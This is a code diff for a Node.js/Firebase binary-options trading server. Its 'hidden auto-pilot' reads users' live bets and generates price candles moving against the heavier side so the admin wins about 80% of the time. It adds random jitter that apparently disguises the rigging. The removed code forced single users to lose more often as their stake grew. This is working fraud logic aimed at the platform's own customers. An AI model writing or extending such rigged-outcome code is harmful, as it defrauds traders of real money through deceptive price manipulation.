@@ -36,11 +36,11 @@ const TIMEFRAME = 60000;
 const TICK_MS = 300;
 const MIN_PRICE = 0.00001;
 const HISTORY_SEED_COUNT = 100;
+const MAX_CANDLES = 5000; // Added to prevent undefined error in array shift
 
 // 🔥 ADMIN HIDDEN AUTO-PILOT SETTINGS 🔥
 const SMART_AUTO_PILOT = true; 
 const ADMIN_WIN_RATIO = 0.80;  // 80% Win Rate for Admin
-const MAX_CANDLES = 350;
 
 const markets = {}; 
 const activeTradesDb = {}; 
@@ -49,45 +49,16 @@ function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
 function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }
 
 // --- Firebase Listeners ---
-const marketListeners = {};
-
 db.ref('admin/markets').on('value', (snapshot) => {
     const fbMarkets = snapshot.val() || {};
-    const currentMarketIds = Object.keys(markets);
-    const fbMarketIds = Object.keys(fbMarkets);
+    Object.keys(fbMarkets).forEach(marketId => {
+        const nodeData = fbMarkets[marketId] || {};
+        
+        activeTradesDb[marketId] = nodeData.activeTrades || {};
 
-    // Add new markets and attach listeners
-    fbMarketIds.forEach(marketId => {
-        const nodeData = fbMarkets[marketId];
-        const type = nodeData?.type;
-
-        // Initialize new market if it's new and of the correct type
+        const type = nodeData.type;
         if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
             initializeNewMarket(marketId);
-            console.log(`Initialized new market: ${marketId}`);
-        }
-
-        // Attach a real-time listener for activeTrades if not already attached
-        if (!marketListeners[marketId]) {
-            const tradesRef = db.ref(`admin/markets/${marketId}/activeTrades`);
-            tradesRef.on('value', (tradesSnapshot) => {
-                activeTradesDb[marketId] = tradesSnapshot.val() || {};
-                // console.log(`Active trades for ${marketId} updated:`, Object.keys(activeTradesDb[marketId]).length);
-            });
-            marketListeners[marketId] = tradesRef;
-        }
-    });
-
-    // Clean up listeners for removed markets
-    currentMarketIds.forEach(marketId => {
-        if (!fbMarketIds.includes(marketId)) {
-            if (marketListeners[marketId]) {
-                marketListeners[marketId].off(); // Detach listener
-                delete marketListeners[marketId];
-            }
-            delete markets[marketId];
-            delete activeTradesDb[marketId];
-            console.log(`Cleaned up removed market: ${marketId}`);
         }
     });
 });
@@ -165,31 +136,6 @@ function generateDynamicCandle(timestamp, open, command) {
     };
 }
 
-function calculatePriceAtProgress(candle, progress) {
-    let idealPrice;
-    const pattern = candle.pattern || 'NORMAL';
-
-    // This logic mirrors the client-side animation to find the exact price at a given progress point
-    if (pattern.includes('HAMMER') || pattern === 'DRAGONFLY_DOJI') {
-        if (progress < 0.6) idealPrice = candle.open - (candle.open - candle.targetLow) * (progress / 0.6);
-        else idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((progress - 0.6) / 0.4);
-    } 
-    else if (pattern.includes('SHOOTING_STAR') || pattern === 'GRAVESTONE_DOJI') {
-        if (progress < 0.6) idealPrice = candle.open + (candle.targetHigh - candle.open) * (progress / 0.6);
-        else idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetClose) * ((progress - 0.6) / 0.4);
-    }
-    else if (pattern.includes('DOJI') || pattern.includes('SPINNING_TOP')) {
-        if (progress < 0.3) idealPrice = candle.open + (candle.targetHigh - candle.open) * (progress / 0.3);
-        else if (progress < 0.7) idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetLow) * ((progress - 0.3) / 0.4);
-        else idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((progress - 0.7) / 0.3);
-    }
-    else {
-        const easeProgress = 1 - Math.pow(1 - progress, 3);
-        idealPrice = candle.open + (candle.targetClose - candle.open) * easeProgress;
-    }
-    return roundPrice(idealPrice);
-}
-
 async function initializeNewMarket(marketId) {
     const path = marketPathFromId(marketId);
     let startPrice = 1.15;
@@ -227,51 +173,22 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
             marketData.nextCandleCommand = null;
         } 
         
-        // Priority 2: Smart Auto-Pilot (New Logic)
+        // Priority 2: Smart Auto-Pilot (Hidden from Panel, operates in Backend)
         if (!newCandle && SMART_AUTO_PILOT) {
             const trades = activeTradesDb[marketData.marketId] || {};
-            const tradeValues = Object.values(trades);
-            const uniqueUserIds = new Set(tradeValues.map(t => t.uid));
+            let upVol = 0, downVol = 0;
+            
+            Object.values(trades).forEach(t => {
+                if (t.direction === 'UP') upVol += t.amount;
+                if (t.direction === 'DOWN') downVol += t.amount;
+            });
 
-            if (uniqueUserIds.size === 1) {
-                // --- SINGLE USER LOGIC ---
-                const trade = tradeValues[0];
-                const amount = trade.amount;
-                let userWinChance;
-
-                if (amount <= 10) {
-                    userWinChance = 0.30; // 30% win rate for user
-                } else if (amount > 10 && amount <= 100) {
-                    userWinChance = 0.10; // 10% win rate for user
-                } else { // amount > 100
-                    userWinChance = 0.05; // 5% win rate for user
-                }
-
-                const shouldUserWin = Math.random() < userWinChance;
-                
-                if (!shouldUserWin) { // Force user to lose
-                    const targetDirection = trade.direction === 'UP' ? 'RED' : 'GREEN';
-                    newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
-                    console.log(`[AUTO-PILOT SINGLE] ${marketData.marketId} -> User bet ${amount}. Forcing LOSS with ${targetDirection}. (Win Chance: ${userWinChance*100}%)`);
-                } else { // Let user win
-                    const targetDirection = trade.direction === 'UP' ? 'GREEN' : 'RED';
-                    newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
-                    console.log(`[AUTO-PILOT SINGLE] ${marketData.marketId} -> User bet ${amount}. Allowing WIN with ${targetDirection}. (Win Chance: ${userWinChance*100}%)`);
-                }
-
-            } else if (uniqueUserIds.size > 1) {
-                // --- MULTIPLE USER LOGIC (Volume-based for Admin Profit) ---
-                let upVol = 0, downVol = 0;
-                tradeValues.forEach(t => {
-                    if (t.direction === 'UP') upVol += t.amount;
-                    if (t.direction === 'DOWN') downVol += t.amount;
-                });
-
-                if (upVol > 0 || downVol > 0) {
-                    // Always make the admin win
+            if (upVol > 0 || downVol > 0) {
+                if (Math.random() < ADMIN_WIN_RATIO) {
                     const targetDirection = upVol > downVol ? 'RED' : 'GREEN';
                     newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
-                    console.log(`[AUTO-PILOT MULTI] ${marketData.marketId} -> U:${upVol} D:${downVol}. Forcing ${targetDirection} for admin profit.`);
+                    newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
+                    console.log(`[AUTO-PILOT] ${marketData.marketId} -> U:${upVol} D:${downVol}. Forcing ${targetDirection}`);
                 }
             }
         }
@@ -383,110 +300,6 @@ app.get('/api/history/:marketId', (req, res) => {
 });
 
 // --- REST API ENDPOINT ---
-app.post('/api/trade/place', async (req, res) => {
-    const { uid, marketId, direction, amount, payoutRate, expirySettings } = req.body;
-
-    if (!uid || !marketId || !direction || !amount || !payoutRate || !expirySettings) {
-        return res.status(400).json({ success: false, error: 'Missing required trade data.' });
-    }
-
-    const market = markets[marketId];
-    if (!market || market.history.length === 0) {
-        return res.status(404).json({ success: false, error: 'Market not found or not ready.' });
-    }
-
-    try {
-        const liveBaseCandle = market.history[market.history.length - 1];
-        const openPrice = liveBaseCandle.close;
-
-        const now = Date.now();
-        let expiryTimestamp;
-        let resolveOnNextOpen = false;
-        
-        const timeIntoCandle = (now - liveBaseCandle.timestamp);
-
-        if (expirySettings.type === 'time') {
-            const candleEndTime = liveBaseCandle.timestamp + TIMEFRAME;
-            const candlesToWait = Math.floor(expirySettings.value / 60); // Assuming value is in seconds
-
-            if (timeIntoCandle < 30000) { // First half of candle
-                expiryTimestamp = candleEndTime + ((candlesToWait - 1) * TIMEFRAME);
-            } else { // Second half
-                 expiryTimestamp = candleEndTime + (candlesToWait * TIMEFRAME);
-            }
-            resolveOnNextOpen = true;
-        } else {
-            expiryTimestamp = now + (expirySettings.value * 1000);
-        }
-
-        const userRef = db.ref(`users/${uid}`);
-        const userSnapshot = await userRef.once('value');
-        const userData = userSnapshot.val();
-
-        if (!userData || userData.accountStatus !== 'active') {
-            return res.status(403).json({ success: false, error: 'Account not active.' });
-        }
-
-        const realBalance = userData.realBalance || 0;
-        const bonusBalance = userData.bonusBalance || 0;
-
-        if (amount > (realBalance + bonusBalance)) {
-            return res.status(402).json({ success: false, error: 'Insufficient balance.' });
-        }
-
-        const realDeduction = Math.min(amount, realBalance);
-        const bonusDeduction = amount - realDeduction;
-
-        await userRef.update({
-            realBalance: realBalance - realDeduction,
-            bonusBalance: bonusBalance - bonusDeduction
-        });
-
-        const activeTradesRef = db.ref(`users/${uid}/activeTrades`);
-        const newBetRef = activeTradesRef.push();
-        const betData = { 
-            id: newBetRef.key, 
-            amount, 
-            realAmount: realDeduction, 
-            bonusAmount: bonusDeduction, 
-            direction, 
-            openPrice, 
-            expiryTimestamp, 
-            expiryType: expirySettings.type, 
-            entryTimestamp: liveBaseCandle.timestamp, 
-            payoutRate, 
-            market: market.marketId,
-            marketId: market.marketId,
-            resolveOnNextOpen
-        };
-        
-        const updates = {};
-        updates[`users/${uid}/activeTrades/${betData.id}`] = betData;
-        updates[`admin/markets/${marketId}/activeTrades/${betData.id}`] = { amount, direction, uid, timestamp: betData.entryTimestamp };
-        
-        await db.ref().update(updates);
-        
-        res.json({ success: true, trade: betData });
-
-    } catch (error) {
-        console.error("Error placing trade on server:", error);
-        // Attempt to refund user if error occurred after balance deduction
-        // This is a simplified refund, a more robust system might be needed for production
-        const userRef = db.ref(`users/${uid}`);
-        const userSnapshot = await userRef.once('value');
-        const userData = userSnapshot.val();
-        const realBalance = userData.realBalance || 0;
-        const bonusBalance = userData.bonusBalance || 0;
-        const realDeduction = Math.min(amount, realBalance);
-        const bonusDeduction = amount - realDeduction;
-        await userRef.update({
-            realBalance: realBalance + realDeduction,
-            bonusBalance: bonusBalance + bonusDeduction
-        });
-        res.status(500).json({ success: false, error: 'Server error while placing trade.' });
-    }
-});
-
 app.post('/api/admin/command', (req, res) => {
     const { marketId, command } = req.body;
     if (!marketId || !command) {
@@ -530,125 +343,6 @@ setInterval(() => {
     }
 }, TICK_MS);
 
-// --- Core Trade Resolution Engine ---
-async function resolveExpiredTrades() {
-    const now = Date.now();
-    const updates = {};
-    const tradeResolutionPromises = [];
-
-    // Iterate through markets which have active trades, using the admin-readable path.
-    for (const marketId in activeTradesDb) {
-        const tradesInMarket = activeTradesDb[marketId];
-        for (const tradeId in tradesInMarket) {
-            const adminTradeInfo = tradesInMarket[tradeId];
-            
-            // The admin node might not have expiryTimestamp, so we must fetch the full trade data from the user's node.
-            const tradeRef = db.ref(`users/${adminTradeInfo.uid}/activeTrades/${tradeId}`);
-
-            const resolutionPromise = tradeRef.once('value').then(async (tradeSnap) => {
-                const trade = tradeSnap.val();
-
-                // If trade doesn't exist in user's path, or isn't expired, or is stuck for too long, clean it up.
-                if (!trade || trade.expiryTimestamp > now) {
-                    if (now > (trade?.expiryTimestamp || adminTradeInfo.timestamp) + 120000) { // Failsafe for stuck trades older than 2 mins
-                         console.log(`Failsafe: Removing stuck trade ${tradeId} for user ${adminTradeInfo.uid}`);
-                         updates[`users/${adminTradeInfo.uid}/activeTrades/${tradeId}`] = null;
-                         updates[`admin/markets/${marketId}/activeTrades/${tradeId}`] = null;
-                    }
-                    return;
-                }
-
-                let closingPrice;
-                const history = markets[marketId]?.history;
-                if (!history || history.length === 0) {
-                    console.warn(`Cannot resolve trade ${tradeId}, no history for market ${marketId}`);
-                    return;
-                }
-                
-                // Determine closing price
-                if (trade.resolveOnNextOpen) {
-                    const closingCandle = history.find(c => c.timestamp === trade.expiryTimestamp);
-                    if (closingCandle) closingPrice = closingCandle.open;
-                } else {
-                    const containingCandle = history.find(c => trade.expiryTimestamp > c.timestamp && trade.expiryTimestamp <= c.timestamp + TIMEFRAME);
-                    if (containingCandle) {
-                        const progress = (trade.expiryTimestamp - containingCandle.timestamp) / TIMEFRAME;
-                        closingPrice = calculatePriceAtProgress(containingCandle, Math.min(1.0, progress));
-                    }
-                }
-
-                if (typeof closingPrice === 'undefined') {
-                     if (now > trade.expiryTimestamp + 5000) { // After 5s, if still no price, force a push.
-                        closingPrice = parseFloat(trade.openPrice);
-                     } else {
-                        return; // Price not available yet, wait for next check.
-                     }
-                }
-
-                let result, payout = 0, profitChange = 0;
-                const amount = parseFloat(trade.amount);
-                const priceDifference = closingPrice - parseFloat(trade.openPrice);
-
-                if (Math.abs(priceDifference) < 1e-6) {
-                    result = 'push';
-                    payout = amount;
-                } else if ((priceDifference > 0 && trade.direction === 'UP') || (priceDifference < 0 && trade.direction === 'DOWN')) {
-                    result = 'win';
-                    payout = amount * trade.payoutRate;
-                    profitChange = payout - amount;
-                } else {
-                    result = 'loss';
-                    profitChange = -amount;
-                }
-
-                // Prepare DB updates for this single trade
-                updates[`users/${adminTradeInfo.uid}/tradeHistory/${tradeId}`] = { ...trade, closePrice: closingPrice, result: result, payout: payout };
-                updates[`users/${adminTradeInfo.uid}/activeTrades/${tradeId}`] = null;
-                updates[`admin/markets/${marketId}/activeTrades/${tradeId}`] = null;
-                
-                // Atomically update user stats and balances
-                const userRef = db.ref(`users/${adminTradeInfo.uid}`);
-                await userRef.transaction(currentData => {
-                    if (currentData) {
-                        if (result === 'push') {
-                            currentData.realBalance = (currentData.realBalance || 0) + (trade.realAmount || 0);
-                            currentData.bonusBalance = (currentData.bonusBalance || 0) + (trade.bonusAmount || 0);
-                        } else if (result === 'win') {
-                            currentData.realBalance = (currentData.realBalance || 0) + payout;
-                        }
-                        const todayUTC = new Date().toISOString().slice(0, 10);
-                        if (currentData.dailyProfitDate !== todayUTC) {
-                            currentData.dailyProfit = 0;
-                            currentData.dailyProfitDate = todayUTC;
-                        }
-                        currentData.dailyProfit = (currentData.dailyProfit || 0) + profitChange;
-                        currentData.totalTradeVolume = (currentData.totalTradeVolume || 0) + amount;
-                        currentData.totalProfitLoss = (currentData.totalProfitLoss || 0) + profitChange;
-                        currentData.lastTradeTimestamp = now;
-                    }
-                    return currentData;
-                });
-            });
-            tradeResolutionPromises.push(resolutionPromise);
-        }
-    }
-
-    await Promise.all(tradeResolutionPromises);
-
-    if (Object.keys(updates).length > 0) {
-        try {
-            await db.ref().update(updates);
-        } catch (error) {
-            console.error("Error batch-updating resolved trades:", error);
-        }
-    }
-}
-
-// Add the new interval to the main loop section
-setInterval(resolveExpiredTrades, 2000); // Check for expired trades every 2 seconds
-
 app.get('/ping', (_req, res) => res.send('Server V30 - Perfect Animations Active'));
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`Server running on ${PORT}`));
-
-// --- END OF FILE ---
